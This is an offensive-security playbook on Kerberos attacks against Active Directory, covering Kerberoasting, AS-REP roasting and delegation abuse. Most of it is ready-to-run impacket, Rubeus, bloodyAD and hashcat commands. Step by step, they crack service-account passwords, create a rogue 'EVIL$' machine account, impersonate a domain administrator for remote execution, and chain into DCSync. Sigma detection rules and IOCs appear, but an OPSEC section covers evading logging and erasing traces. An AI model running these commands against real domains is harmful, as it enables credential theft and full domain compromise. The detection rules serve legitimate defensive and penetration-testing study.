# Kerberos Roasting & Delegation Abuse

ATT&CK: T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting), T1558 (Steal/Forge Kerberos Tickets),
T1098 (Account Manipulation for RBCD). CWE-261 (Weak Encoding of Password — RC4 TGS),
CWE-308 (Single-Factor / no preauth), CWE-269 (Improper Privilege Management — delegation).

## Theory / Mechanism

- **Kerberoasting**: any authenticated user can request a TGS (KRB_TGS-REP) for any account with an
  SPN. The ST is partly encrypted with the service account's password-derived key, so it is cracked
  offline. RC4 (etype 23) tickets crack fastest; AES (17/18) slower.
- **AS-REP roasting**: accounts with `DONT_REQ_PREAUTH` return an AS-REP whose enc-part is derived
  from the user's key, with no credential needed — crackable offline.
- **Delegation**: Kerberos S4U lets a service obtain tickets *on behalf of* a user.
  - **Unconstrained (TRUSTED_FOR_DELEGATION)**: the service caches the caller's TGT — capture it.
  - **Constrained (msDS-AllowedToDelegateTo + TrustedToAuthForDelegation)**: S4U2self+S4U2proxy;
    the SPN service class is *not validated* by S4U2proxy, so `/altservice` pivots to cifs/host/etc.
  - **Resource-Based Constrained Delegation (RBCD)**: write `msDS-AllowedToActOnBehalfOfOtherIdentity`
    on a target you have GenericWrite over → impersonate any user to that target.

## Modern 2024-2026 variants (verified)

- **Targeted Kerberoasting**: with GenericWrite/GenericAll over a victim user, set a temporary SPN,
  roast it, then remove the SPN (no need for the account to already have one).
- **AES downgrade roasting**: Rubeus `/tgtdeleg` and `/rc4opsec` request RC4 only where allowed,
  but AES-only domains (and Win11 24H2 / Server 2025 NTLM removal) push defenders to AES — hashcat
  modes 19600 (AES128) / 19700 (AES256) handle those.
- **RBCD remains a "no-fix" LPE** in domains where LDAP signing is not enforced (see KrbRelayUp).
- **`MachineAccountQuota` default = 10** still lets standard users create the computer account RBCD
  needs; bloodyAD/addcomputer create it over LDAP/LDAPS.

## Complete working commands

### Kerberoasting
```bash
# Linux (impacket) — list then request, force RC4 where possible
impacket-GetUserSPNs corp.local/user:'Pass' -dc-ip <DC_IP>
impacket-GetUserSPNs corp.local/user:'Pass' -dc-ip <DC_IP> -request -outputfile tgs.hash
# Crack
hashcat -m 13100 tgs.hash rockyou.txt          # RC4 TGS
hashcat -m 19700 tgs.hash rockyou.txt          # AES256 TGS

# Windows (Rubeus) — OPSEC-aware
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt    # only AES-disabled accounts
Rubeus.exe kerberoast /user:svc_sql /nowrap            # single target, no AES noise
```

### Targeted Kerberoasting (GenericWrite over victim)
```bash
# Add SPN, roast, restore
bloodyAD -d corp.local -u attacker -p 'Pass' --host <DC_IP> set object victim servicePrincipalName \
  -v 'cifs/fake.corp.local'
impacket-GetUserSPNs corp.local/attacker:'Pass' -dc-ip <DC_IP> -request-user victim -outputfile v.hash
bloodyAD -d corp.local -u attacker -p 'Pass' --host <DC_IP> remove object victim servicePrincipalName \
  -v 'cifs/fake.corp.local'
hashcat -m 13100 v.hash rockyou.txt
```

### AS-REP roasting
```bash
# Find no-preauth users via BloodHound, then:
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.hash
# Targeted (if GenericWrite: flip DONT_REQ_PREAUTH, roast, flip back)
bloodyAD -d corp.local -u attacker -p 'Pass' --host <DC_IP> add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers corp.local/victim -no-pass -dc-ip <DC_IP> -format hashcat
hashcat -m 18200 asrep.hash rockyou.txt
```

### RBCD takeover (GenericWrite over TARGET$ + can create machine account)
```bash
# 1. Create attacker-controlled machine account (MachineAccountQuota default 10)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip <DC_IP> corp.local/user:'Pass'
# 2. Write RBCD on the victim resource
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip <DC_IP> corp.local/user:'Pass'
# 3. S4U2self+S4U2proxy: impersonate a DA to the target's cifs SPN
impacket-getST -spn cifs/target.corp.local -impersonate administrator -dc-ip <DC_IP> corp.local/'EVIL$':'Evil123!'
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass target.corp.local
```
> Use `scripts/rbcd_takeover.py` to automate steps 1-3 (add computer → write RBCD → getST).

### Constrained delegation w/ protocol transition + altservice pivot
```bash
# svc account has TrustedToAuthForDelegation + AllowedToDelegateTo: http/web01
Rubeus.exe s4u /user:svc_web /aes256:<KEY> /impersonateuser:administrator \
  /msdsspn:http/web01.corp.local /altservice:cifs,host,ldap,mssql /ptt
dir \\web01.corp.local\c$
```

### Unconstrained delegation TGT capture (chains into CVE-2025-33073 → DCSync)
```bash
# On a compromised unconstrained-delegation host, monitor for inbound TGTs
Rubeus.exe monitor /interval:5 /nowrap
# Coerce a DC to authenticate to that host (see coercion-relay.md), capture DC$ TGT, then DCSync.
```

## Detection

```yaml
title: Kerberoasting RC4 TGS Burst
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4769, TicketEncryptionType: '0x17', TicketOptions: '0x40810000' }
  filter: { ServiceName|endswith: '$' }
  timeframe: 5m
  condition: sel and not filter | count(ServiceName) by IpAddress > 5
level: high
---
title: RBCD Attribute Write
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 5136, AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity' }
  condition: sel
level: high
```
IOCs: 4768 AS-REQ with no preauth (etype 23); 4769 RC4 TGS for many distinct SPNs from one host;
4741 (computer account created) by a non-admin user; 4738/5136 transient `servicePrincipalName`
add+remove on a user; S4U `getST` ticket files on disk.

## OPSEC

- Prefer requesting **few** SPNs slowly; AES-enabled accounts produce no RC4 noise (use `/rc4opsec`).
- Targeted roasting leaves an SPN/UAC modification — restore the attribute immediately.
- RBCD creates a machine account (4741) — delete `EVIL$` and clear the `msDS-AllowedToActOn...`
  attribute when done.
- S4U2self for protocol transition emits 4769 with `Transited Services` — blends best when the
  delegation host is genuinely a service host.
- Clean ticket cache: `klist purge` / remove `.ccache` files.

## References
- The Hacker Recipes — Kerberoasting, AS-REP roasting, Kerberos delegation (thehacker.recipes)
- GhostPack/Rubeus README — `kerberoast /rc4opsec`, `s4u`, `monitor`
- snovvcrash & Dec0ne — KrbRelayUp (RBCD no-fix LPE, github.com/Dec0ne/KrbRelayUp)
- hashcat mode reference — 13100 / 18200 / 19600 / 19700
